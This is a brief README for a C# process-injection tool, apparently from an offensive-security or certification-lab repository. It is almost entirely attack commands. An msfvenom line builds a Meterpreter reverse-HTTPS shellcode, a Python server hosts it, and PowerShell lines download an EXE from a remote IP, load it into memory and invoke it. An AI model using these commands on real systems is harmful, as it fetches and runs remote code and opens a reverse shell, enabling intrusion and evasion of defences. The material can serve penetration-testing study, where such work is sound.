## TryHarder.cs

Another Process Injection technique that loads the shellcode remotely.
The idea of this technique is by `Sektor 7` and ported to C# by [saulgoodman](https://github.com/saulg00dmin).<br>

Create Shellcode using msfvenom:<br>
- `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw EXITFUNC=thread -o shellcode.bin`

Serve the `shellcode.bin` with python server: `python3 -m http.server 80`

Convert the EXE into a byte array:<br>
- `$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.190/Tryharder.exe')`

Load the EXE into memory:<br>
- `$assem = [System.Reflection.Assembly]::Load($data)`

Invoke its entry point:
- `$assem.EntryPoint.Invoke($null, @([string[]]@()))`
